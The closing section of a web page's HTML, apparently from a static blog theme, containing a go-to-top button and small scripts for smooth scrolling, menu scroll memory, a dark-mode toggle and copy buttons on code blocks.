<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
